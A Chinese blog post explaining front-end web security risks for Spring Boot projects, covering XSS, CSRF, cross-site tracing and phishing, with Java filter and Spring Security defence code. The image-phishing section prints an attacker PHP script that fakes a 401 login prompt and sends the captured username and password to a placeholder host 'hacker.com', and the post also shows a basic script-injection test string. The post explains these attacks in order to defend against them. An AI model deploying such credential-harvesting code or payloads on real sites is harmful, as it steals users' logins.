---
title: 主流web前端安全需要防范的点
categories:
  - javascript
date: 2020-04-13 20:05:22
tags:
---

# 主流web前端安全需要防范的点

## 概述

我们的web应用项目分为两类，只内网可访问项目和外网可访问项目，内网项目因为有防火墙策略，可以暂缓对前端安全的审查，但外网项目需要注意很多前端安全风险，这些风险会被黑客利用，轻则篡改网页内容，重则窃取网站内部数据，更为严重的则是在网页中植入恶意代码，使得用户受到侵害。常见的安全漏洞如下：

- XSS 攻击：对 Web 页面注入脚本，使用 JavaScript 窃取用户信息，诱导用户操作。
- CSRF 攻击：伪造用户请求向网站发起恶意请求。
- 钓鱼攻击：利用网站的跳转链接或者图片制造钓鱼陷阱。
- HTTP参数污染：利用对参数格式验证的不完善，对服务器进行参数注入攻击。
- 远程代码执行：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。

值得注意的是，这些安全隐患虽然是从前端发起攻击，但实质的防范是需要后端的协助，一般后端框架本身会提供集成方案来解决这些风险，如Spring Security，我们以团队主流的框架spring boot为例，自检是否有被注意到（因为我并不会java，但会其他后端技术，因为原理是一样的，框架的实现也都是大同小异的，所以按照我提供的方案去找下你们自己框架的，肯定是可以直接用的直接用的方法配置的）。

## 安全威胁XSS的防范

### 简介
XSS（cross-site scripting跨域脚本攻击）攻击是最常见的 Web 攻击，其重点是『跨域』和『客户端执行』。
XSS 攻击一般分为两类：
- Reflected XSS（反射型的 XSS 攻击）
- Stored XSS（存储型的 XSS 攻击）
对XSS攻击的防范，核心是转义，使XSS攻击代码失效。

### 反射型 XSS 及其防范
反射型的 XSS 攻击，主要是由于服务端接收到客户端的不安全输入，在客户端触发执行从而发起 Web 攻击。比如：

在某购物网站搜索物品，搜索结果会显示搜索的关键词。搜索关键词填入<script>alert('handsome boy')</script>, 点击搜索。页面没有对关键词进行过滤，这段代码就会直接在页面上执行，弹出 alert。

**防范措施**

特殊字符进行转义操作，例如将 < > /等特殊字符转换成html支持的 < >等，这样显示到页面的时候还是那些内容但是不会当成脚本执行了。
这种方式我们用到了SpringFramework自带的HtmlUtils.htmlEscape方法进行替换。

### 存储型 XSS 及其防范

基于存储的 XSS 攻击，是通过提交带有恶意脚本的内容存储在服务器上，当其他人看到这些内容时发起 Web 攻击。

最主要的传参方式之一的表单交互，对参数进行过滤：
```java
package cn.pconline.pcloud.admin.config;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

@WebFilter(filterName = "xssFilter", urlPatterns = "/*", asyncSupported = true)
public class XssFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        XssAndSqlHttpServletRequestWrapper xssRequestWrapper = new XssAndSqlHttpServletRequestWrapper(req);
        chain.doFilter(xssRequestWrapper, response);
    }

    @Override
    public void destroy() {

    }
}
```

考虑到在现在的开发中，更多的是使用json类型做数据交互，所以对json的过滤也是必不可少的，这里是通过修改SpringMVC的json序列化来达到过滤xss的目的：

```java
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.SerializerProvider;
import org.apache.commons.text.StringEscapeUtils;
import java.io.IOException;
public class XssStringJsonSerializer extends JsonSerializer<String> {
	@Override
 	public Class<String> handledType() {
 	return String.class;
}
 	@Override
public void serialize(String value, JsonGenerator jsonGenerator,
 	SerializerProvider serializerProvider) throws IOException {
 		if (value != null) {
 		String encodedValue = StringEscapeUtils.escapeHtml4(value);
 		jsonGenerator.writeString(encodedValue);
 		}
 	}
}
```

### JSONP XSS
JSONP 的 callback 参数非常危险，他有两种风险可能导致 XSS

- callback 参数意外截断js代码，特殊字符单引号双引号，换行符均存在风险。
- callback 参数恶意添加标签（如 <script> ），造成 XSS 漏洞。

因为我对项目的规定是前端项目禁止使用jsonp，所以这一点可以忽略。

### 其他 XSS 的防范方式
浏览器自身具有一定针对各种攻击的防范能力，他们一般是通过开启 Web 安全头生效的。框架内置了一些常见的 Web 安全头的支持。

- CSP
W3C 的 Content Security Policy，简称 CSP，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。

框架内支持 CSP 的配置，不过是默认关闭的，开启后可以有效的防止 XSS 攻击的发生。要配置 CSP , 需要对 CSP 的 policy 策略有了解，具体细节可以参考 CSP 是什么。

- X-Download-Options:noopen
默认开启，禁用 IE 下下载框Open按钮，防止 IE 下下载文件默认被打开 XSS。

- X-Content-Type-Options:nosniff
禁用 IE8 自动嗅探 mime 功能例如 text/plain 却当成 text/html 渲染，特别当本站点 serve 的内容未必可信的时候。

- X-XSS-Protection
IE 提供的一些 XSS 检测与防范，默认开启

close 默认值false，即设置为 1; mode=block


## 安全威胁 CSRF 的防范

### 概述
CSRF（Cross-site request forgery跨站请求伪造，也被称为 One Click Attack 或者 Session Riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。 CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全。因此框架内置了 CSRF 防范方案。

### 防范方式
通常来说，对于 CSRF 攻击有一些通用的防范方案，简单的介绍几种常用的防范方案：

- Synchronizer Tokens：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。
- Double Cookie Defense：将 token 设置在 Cookie 中，在提交 post 请求的时候提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。
- Custom Header：信任带有特定的 header（例如 X-Requested-With: XMLHttpRequest）的请求。这个方案可以被绕过，所以 rails 和 django 等框架都放弃了该防范方式。

Spring Security具有出色的CSRF支持，如果您正在使用Spring MVC的<form:form>标签或Thymeleaf @EnableWebSecurity，默认情况下处于启用状态，CSRF令牌将自动添加为隐藏输入字段。代码示例如下：

```java
 @EnableWebSecurity
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .csrf()
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
    }
}
```

Session vs Cookie 存储：默认配置下，框架会将 CSRF token 存在 Cookie 中，以方便 AJAX 请求获取到。但是所有的子域名都可以设置 Cookie，因此当我们的应用处于无法保证所有的子域名都受控的情况下，存放在 Cookie 中可能有被 CSRF 攻击的风险。所以在子域名存在并不受控的情况下，用 Session 存储csrf token更为保险。

## XST

### 概述
XST 的全称是 Cross-Site Tracing，客户端发 TRACE 请求至服务器，如果服务器按照标准实现了 TRACE 响应，则在 response body 里会返回此次请求的完整头信息。通过这种方式，客户端可以获取某些敏感的头字段，例如 httpOnly 的 Cookie。

拓展阅读
http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html
http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/

### 防范方式
禁止 trace，track，options 三种危险类型请求。

## 钓鱼攻击
钓鱼有多种方式，这里介绍 url 钓鱼、图片钓鱼和 iframe 钓鱼。

### url 钓鱼

服务端未对传入的跳转 url 变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。 由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易； 也可能引发的 XSS 漏洞（主要是跳转常常使用 302 跳转，即设置 HTTP 响应头，Locatioin: url，如果 url 包含了 CRLF，则可能隔断了 HTTP 响应头，使得后面部分落到了 HTTP body，从而导致 XSS 漏洞）。

### 防范方式

- 若跳转的 url 事先是可以确定的，包括 url 和参数的值，则可以在后台先配置好，url 参数只需传对应 url 的索引即可，通过索引找到对应具体 url 再进行跳转；
- 若跳转的 url 事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名；
- 若 1 和 2 都不满足，url 事先无法确定，只能通过前端参数传入，则必须在跳转的时候对 url 进行按规则校验：判断 url 是否在应用授权的白名单内。

框架提供了安全跳转的方法，可以通过配置跳转白名单避免这种风险，spring boot中

### 图片钓鱼

如果可以允许用户向网页里插入未经验证的外链图片，这有可能出现钓鱼风险。

比如常见的 401钓鱼, 攻击者在访问页面时，页面弹出验证页面让用户输入帐号及密码，当用户输入之后，帐号及密码就存储到了黑客的服务器中。 通常这种情况会出现在<img src=$url />中，系统不对$url是否在域名白名单内进行校验。

攻击者可以在自己的服务器中构造以下代码：

401.php：作用为弹出 401 窗口，并且记录用户信息。
```php
<?php
    header('WWW-Authenticate: Basic realm="No authorization"');
    header('HTTP/1.1 401 Unauthorized');
        $domain = "http://hacker.com/fishing/";
        if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){
            header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']);
        }
?>
```
之后攻击者生成一个图片链接<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" />。

当用户访问时，会弹出信息让用户点击，用户输入的用户名及密码会被黑客的服务器偷偷记录。

### 防范方式

做 url 过滤

### iframe 钓鱼

iframe 钓鱼，通过内嵌 iframe 到被攻击的网页中，攻击者可以引导用户去点击 iframe 指向的危险网站，甚至遮盖，影响网站的正常功能，劫持用户的点击操作。

HTTP 提供了 X-Frame-Options 这个安全头来防止 iframe 钓鱼。默认值为 SAMEORIGIN，只允许同域把本页面当作 iframe 嵌入。

当需要嵌入一些可信的第三方网页时，可以关闭这个配置，不过这也就会导致安全隐患，我的建议是第三方网站使用nginx反向代理重写url，然后继续加这个 HTTP 头。
